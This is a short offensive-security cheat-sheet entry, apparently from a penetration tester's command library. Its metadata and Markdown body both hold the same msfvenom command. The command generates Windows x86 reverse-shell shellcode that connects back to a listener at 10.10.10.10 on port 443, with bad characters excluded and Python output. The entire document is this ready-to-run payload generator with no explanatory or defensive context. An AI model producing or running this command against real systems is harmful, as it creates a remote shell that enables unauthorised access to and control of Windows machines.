---
id: f14ad06e-67c4-43fd-a994-336b3b4af20a
name: Generate Windows Reverse Shell Payload
type: command
executor: bash
data: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread
  -b "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40" -f py -v shellcode -a x86 --platform
  windows
output: null
created_at: '2023-04-06T03:56:30.382053+00:00'
updated_at: '2023-04-10T20:37:52.592457+00:00'
---

# Generate Windows Reverse Shell Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40" -f py -v shellcode -a x86 --platform windows
```
